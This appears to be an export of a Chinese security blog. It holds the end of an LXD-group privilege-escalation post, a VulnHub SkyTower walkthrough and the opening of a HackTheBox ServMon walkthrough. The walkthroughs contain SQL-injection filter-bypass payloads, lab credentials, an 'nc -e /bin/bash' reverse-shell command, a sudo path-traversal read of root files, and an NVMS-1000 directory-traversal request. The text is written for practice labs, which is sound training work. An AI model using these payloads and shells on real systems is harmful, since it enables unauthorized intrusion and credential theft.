<p>在这里，我们创建了一个lxc容器，为其分配了安全性特权，并将整个磁盘安装在/mnt/root下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lxc <span class="built_in">exec</span> <span class="built_in">test</span> bash </span><br><span class="line">root@<span class="built_in">test</span>:~<span class="comment"># cd /mnt/root </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root<span class="comment"># ls </span></span><br><span class="line">bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var </span><br><span class="line">boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz </span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root<span class="comment"># cd root </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root/root<span class="comment"># ls </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root/root<span class="comment"># touch ICanDoWhatever </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root/root<span class="comment"># exit </span></span><br><span class="line"><span class="built_in">exit</span> </span><br><span class="line">ubuntu@ubuntu:~$ cat /root/ICanDoWhatever </span><br><span class="line">cat: /root/ICanDoWhatever: Permission denied </span><br><span class="line">ubuntu@ubuntu:~$ sudo su </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># cat /root/ICanDoWhatever </span></span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># ls /root </span></span><br><span class="line">ICanDoWhatever </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>现在，来看看如何一次无需手动输入密码或提升权限。我们甚至可以将自己从sudoers中移除，并执行所有这些操作，从而使提权到root变得非常简单。吸取教训后，请谨慎使用lxd组。</p>
<h3 id="下面推荐一个可以用于lxd提权的容器"><a href="#下面推荐一个可以用于lxd提权的容器" class="headerlink" title="下面推荐一个可以用于lxd提权的容器"></a>下面推荐一个可以用于lxd提权的容器</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhZ2h1bC9seGQtYWxwaW5lLWJ1aWxkZXI=">LXD Alpine Linux image builder<i class="fa fa-external-link-alt"></i></span></p>
<p>该脚本提供了一种创建Alpine Linux映像以与LXD一起使用的方法。它基于LXC模板。仅通过安装基于alpine的meta-package即可构建映像。默认情况下启用网络和系统日志。</p>
<p>用法：</p>
<p>为了构建最新的Alpine映像，只需运行脚本（必须以root身份完成）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./build-alpine</span><br></pre></td></tr></table></figure>

<p>有关更多选项，请查看帮助：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./build-alpine -h</span><br></pre></td></tr></table></figure>

<p>生成映像后，可以将其作为映像添加到LXD中，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --<span class="built_in">alias</span> alpine-v3.3</span><br></pre></td></tr></table></figure>

<p><font color="red">注意：</font></p>
<p>如果运行提权命令之前，状态如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | STOPPED |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>需要运行下面命令来启动容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc start right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | RUNNING |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>

<p>然后运行下面命令提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lxc <span class="built_in">exec</span> right-whippet --mode=interactive /bin/sh</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">lxc <span class="built_in">exec</span> right-whippet bash</span><br></pre></td></tr></table></figure>

<p><font color="blue"><strong><em>By:lucifer11——QQ:1185151867</em></strong></font></p>
]]></content>
      <categories>
        <category>linux提权</category>
      </categories>
      <tags>
        <tag>linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[SkyTower-1]</title>
    <url>/2020/04/09/SkyTower-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：SkyTower: 1<br>发布日期：2014年6月26日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>SkyTower.zip</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9za3l0b3dlci9Ta3lUb3dlci56aXA=">https://download.vulnhub.com/skytower/SkyTower.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9za3l0b3dlci9Ta3lUb3dlci56aXAudG9ycmVudA==">https://download.vulnhub.com/skytower/SkyTower.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>欢迎来到SkyTower：1</p>
<p>该CTF靶机是由Telspace Systems在ITWeb安全峰会和BSidesCPT（开普敦）上为CTF设计的。目的是测试中级到高级的安全爱好者，使用多方面的方法攻击系统并获得“flag”的能力。</p>
<p>将需要跨系统和应用程序漏洞的各个方面的技能，以及对各种服务以及如何攻击它们的理解。最重要的是，渗透测试的逻辑思维和方法性方法将发挥作用，以使能够成功地攻击此系统。尝试不同的变体和方法。会发现自动化工具无法为提供帮助。</p>
<p>鼓励先自己尝试一下，给自己足够的时间，然后再回到下面的演练中。</p>
<p>请享用！<br>Telspace Systems<br>@telspacesystems</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/SkyTower<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV 192.168.56.101</span></span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">80/tcp   open     http       Apache httpd 2.2.22 ((Debian))</span><br><span class="line">3128/tcp open     http-proxy Squid http proxy 3.1.20</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 22,80,3128 -v -A -T4 --script=vuln 192.168.56.101</span></span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">80/tcp   open     http       Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.101</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.101:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: login.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|_  /login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.22 (Debian)</span></span><br><span class="line"><span class="string">| http-sql-injection: </span></span><br><span class="line"><span class="string">|   Possible sqli for forms:</span></span><br><span class="line"><span class="string">|     Form at path: /, form&#x27;</span>s action: login.php. Fields that might be vulnerable:</span><br><span class="line">|_      email</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">3128/tcp open     http-proxy Squid http proxy 3.1.20</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-server-header: squid/3.1.20</span></span><br></pre></td></tr></table></figure>

<p>在使用nmap进行主动扫描之后，发现了以下服务。ssh，http，http代理。</p>
<p>ssh端口已被过滤，因此只能访问http和代理。从http开始。</p>
<p>在对目标使用nikto和dirb之后，没有发现任何有趣的东西。</p>
<p>访问80端口的网站，并抓包分析</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub246.jpg"></li>
</ul>
<p>email参数容易受到SQL注入的攻击。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub247.jpg"></li>
</ul>
<p>但是使用sqlmap等自动化sql注入测试工具无法跑出数据，因为对sql注入语句做了过滤，需要想办法寻找payload绕过</p>
<p>多输入一些不同类型的字符测试发包，正如从响应中看到的那样，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL会过滤“OR”可以很容易使用“||”绕过</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub248.jpg"></li>
</ul>
<p>使用以下两个payload都可以绕过对sql注入语句中“or”的过滤</p>
<p>payload1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">email=<span class="string">&#x27; || email LIKE &#x27;</span>%<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>

<p>payload2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;oorr 1&gt; 0＃&#x27;</span></span><br></pre></td></tr></table></figure>

<p>能够绕过身份验证，并显示以下内容。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub249.jpg"></li>
</ul>
<p>当用户登录时，会显示明确的用户名和密码，并提示您登录ssh，但端口已过滤。但是，尝试枚举Web应用程序中的所有用户。启动一个Burp intruder实例以暴力破解并枚举Web应用程序中的所有有效电子邮件，用户名和密码。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub250.jpg"></li>
</ul>
<p>因此，得到了电子邮件，以j开头，另一个以s开头，以w开头。现在，当每封电子邮件登录时，获得了以下数据。</p>
<ul>
<li>Payload used : [email=’ || email LIKE ‘j%’;#]</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username: john</span><br><span class="line">Password: hereisjohn</span><br></pre></td></tr></table></figure>

<ul>
<li>Payload used : [email=’ || email LIKE ‘w%’;#]</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username: william</span><br><span class="line">Password: senseable</span><br></pre></td></tr></table></figure>

<ul>
<li>Payload used : [email=’ || email LIKE ‘s%’;#]</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username: sara</span><br><span class="line">Password: ihatethisjob</span><br></pre></td></tr></table></figure>

<p>因此，在获得SSH用户名和密码后，尝试登录并提升权限。</p>
<p>问题在于SSH端口已被过滤。</p>
<p>通过端口扫描，找到了一个代理，并使用代理链通过代理转发连接并访问ssh。</p>
<p>将以下行添加到/etc/proxychains.conf中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http 192.168.56.101 3128</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>现在尝试通过命令行连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/SkyTower<span class="comment"># proxychains ssh john@127.0.0.1</span></span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|D-chain|-&lt;&gt;-192.168.56.101:3128-&lt;&gt;-127.0.0.1:1080-&lt;--denied</span><br><span class="line">|D-chain|-&lt;&gt;-192.168.56.101:3128-&lt;&gt;&lt;&gt;-127.0.0.1:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">The authenticity of host <span class="string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>127.0.0.1<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">john@127.0.0.1&#x27;</span>s password: </span><br><span class="line">Linux SkyTower 3.2.0-4-amd64 <span class="comment">#1 SMP Debian 3.2.54-2 x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Jun 20 07:41:08 2014</span><br><span class="line"></span><br><span class="line">Funds have been withdrawn</span><br><span class="line">Connection to 127.0.0.1 closed.</span><br></pre></td></tr></table></figure>

<p>无法使用用户william登录。使用sara和john auto登录将关闭连接。尝试在ssh连接时执行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/SkyTower<span class="comment"># proxychains ssh john@127.0.0.1 nc 192.168.56.102 5566 -e /bin/bash</span></span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|D-chain|-&lt;&gt;-192.168.56.101:3128-&lt;&gt;-127.0.0.1:1080-&lt;--denied</span><br><span class="line">|D-chain|-&lt;&gt;-192.168.56.101:3128-&lt;&gt;&lt;&gt;-127.0.0.1:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">john@127.0.0.1<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>

<p>kali端使用nc监听端口，得到反弹回来的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 34901</span><br><span class="line">id</span><br><span class="line">uid=1000(john) gid=1000(john) groups=1000(john)</span><br><span class="line">whoami</span><br><span class="line">john</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/john</span><br></pre></td></tr></table></figure>

<p>代表用户john进行枚举后没有发现任何有趣的内容，因此该切换帐户了。无法使用william登录，因此只保留了sara。以sara身份登录后，看起来sara可以使用sudo运行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 34906</span><br><span class="line">id</span><br><span class="line">uid=1001(sara) gid=1001(sara) groups=1001(sara)</span><br><span class="line">whoami</span><br><span class="line">sara</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sara on this host:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sara may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*</span><br></pre></td></tr></table></figure>

<p>如所见，sara可以使用sudo运行以下命令cat和ls，目录必须为/accounts/*</p>
<p>找到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/cat /accounts/../../../root/flag.txt</span><br><span class="line">Congratz, have a cold one to celebrate!</span><br><span class="line">root password is theskytower</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub251.jpg"></li>
</ul>
<p>然后连接root账户的ssh，成功获取root权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/SkyTower<span class="comment"># proxychains ssh root@127.0.0.1 -t &quot;/bin/bash&quot;</span></span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|D-chain|-&lt;&gt;-192.168.56.101:3128-&lt;&gt;-127.0.0.1:1080-&lt;--denied</span><br><span class="line">|D-chain|-&lt;&gt;-192.168.56.101:3128-&lt;&gt;&lt;&gt;-127.0.0.1:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">root@127.0.0.1<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">root@SkyTower:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@SkyTower:~# whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">root@SkyTower:~# ls</span></span><br><span class="line"><span class="string">flag.txt</span></span><br><span class="line"><span class="string">root@SkyTower:~# cat flag.txt </span></span><br><span class="line"><span class="string">Congratz, have a cold one to celebrate!</span></span><br><span class="line"><span class="string">root password is theskytower</span></span><br><span class="line"><span class="string">root@SkyTower:~#</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub252.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>sql注入绕过过滤</li>
<li>使用proxychains代理http-proxy连接被过滤的ssh端口</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[ServMon]</title>
    <url>/2020/04/23/ServMon/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>操作系统：Windows<br>难度：容易<br>点数：20<br>发行：2020年4月11日<br>IP：10.10.10.184</p>
<p>user一血用时：3小时08分钟06秒。<br>root一血用时：3小时34分钟10秒。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb28.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -sC -sV -v -p- 10.10.10.184 --min-rate=10000</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">21/tcp    open  ftp           Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_01-18-20  12:05PM       &lt;DIR&gt;          Users</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)</span><br><span class="line">|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)</span><br><span class="line">|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)</span><br><span class="line">80/tcp    open  http</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest, HTTPOptions, RTSPRequest:</span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Content-type: text/html</span><br><span class="line">|     Content-Length: 340</span><br><span class="line">|     Connection: close</span><br><span class="line">|     AuthInfo:</span><br><span class="line">|     &lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">|     &lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;&lt;/title&gt;</span><br><span class="line">|     &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">|     window.location.href = <span class="string">&quot;Pages/login.htm&quot;</span>;</span><br><span class="line">|     &lt;/script&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   NULL:</span><br><span class="line">|     HTTP/1.1 408 Request Timeout</span><br><span class="line">|     Content-type: text/html</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|_    AuthInfo:</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">135/tcp   open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">445/tcp   open  microsoft-ds?</span></span><br><span class="line"><span class="string">5040/tcp  open  unknown</span></span><br><span class="line"><span class="string">5666/tcp  open  tcpwrapped</span></span><br><span class="line"><span class="string">6063/tcp  open  x11?</span></span><br><span class="line"><span class="string">6699/tcp  open  napster?</span></span><br><span class="line"><span class="string">7680/tcp  open  pando-pub?</span></span><br><span class="line"><span class="string">8443/tcp  open  ssl/https-alt</span></span><br><span class="line"><span class="string">| fingerprint-strings:</span></span><br><span class="line"><span class="string">|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:</span></span><br><span class="line"><span class="string">|     HTTP/1.1 404</span></span><br><span class="line"><span class="string">|     Content-Length: 18</span></span><br><span class="line"><span class="string">|     Document not found</span></span><br><span class="line"><span class="string">|   GetRequest:</span></span><br><span class="line"><span class="string">|     HTTP/1.1 302</span></span><br><span class="line"><span class="string">|     Content-Length: 0</span></span><br><span class="line"><span class="string">|     Location: /index.html</span></span><br><span class="line"><span class="string">|     refo</span></span><br><span class="line"><span class="string">|_    2-contai</span></span><br><span class="line"><span class="string">| http-methods:</span></span><br><span class="line"><span class="string">|_  Supported Methods: GET</span></span><br><span class="line"><span class="string">| http-title: NSClient++</span></span><br><span class="line"><span class="string">|_Requested resource was /index.html</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=localhost</span></span><br><span class="line"><span class="string">| Issuer: commonName=localhost</span></span><br><span class="line"><span class="string">| Public Key type: rsa</span></span><br><span class="line"><span class="string">| Public Key bits: 2048</span></span><br><span class="line"><span class="string">| Signature Algorithm: sha1WithRSAEncryption</span></span><br><span class="line"><span class="string">| Not valid before: 2020-01-14T13:24:20</span></span><br><span class="line"><span class="string">| Not valid after:  2021-01-13T13:24:20</span></span><br><span class="line"><span class="string">| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4</span></span><br><span class="line"><span class="string">|_SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334</span></span><br><span class="line"><span class="string">|_ssl-date: TLS randomness does not represent time</span></span><br><span class="line"><span class="string">49664/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49665/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49668/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49669/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49670/tcp open  msrpc         Microsoft Windows RPC</span></span><br></pre></td></tr></table></figure>

<p>发现21端口可以使用Anonymous用户无需密码登录</p>
<p>里面发现2个用户文件夹</p>
<p>Nadine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nathan,</span><br><span class="line"></span><br><span class="line">I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">Nadine</span><br></pre></td></tr></table></figure>

<p>Nathan</p>
<p>Notes to do.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1) Change the password <span class="keyword">for</span> NVMS - Complete</span><br><span class="line">2) Lock down the NSClient Access - Complete</span><br><span class="line">3) Upload the passwords</span><br><span class="line">4) Remove public access to NVMS</span><br><span class="line">5) Place the secret files <span class="keyword">in</span> SharePoint</span><br></pre></td></tr></table></figure>

<p>80端口上有一个web应用程序NVMS-1000，为目录遍历漏洞，网上能搜索到exploit</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDc3NzQ=">NVMS-1000-Directory-Traversal<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>查看该exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Title: NVMS-1000 - Directory Traversal</span></span><br><span class="line"><span class="comment"># Date: 2019-12-12</span></span><br><span class="line"><span class="comment"># Author: Numan Türle</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://en.tvt.net.cn/</span></span><br><span class="line"><span class="comment"># Version : N/A</span></span><br><span class="line"><span class="comment"># Software Link : http://en.tvt.net.cn/products/188.html</span></span><br><span class="line"></span><br><span class="line">POC</span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line">GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1</span><br><span class="line">Host: 12.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Response</span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line">; <span class="keyword">for</span> 16-bit app support</span><br><span class="line">[fonts]</span><br><span class="line">[extensions]</span><br><span class="line">[mci extensions]</span><br><span class="line">[files]</span><br><span class="line">[Mail]</span><br><span class="line">MAPI=1</span><br></pre></td></tr></table></figure>

<p>利用此漏洞和之前收集的文本文件的信息，可有读出下面的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /../../../../../../../../../../../../users/Nathan/Desktop/Passwords.txt HTTP/1.1</span><br><span class="line">Host: 10.10.10.184</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Authorization: Basic Y3F3Yzpxd2M=</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 103</span><br><span class="line">Origin: http://10.10.10.184</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.10.184/Pages/login.htm</span><br><span class="line">Cookie: dataPort=6063</span><br></pre></td></tr></table></figure>

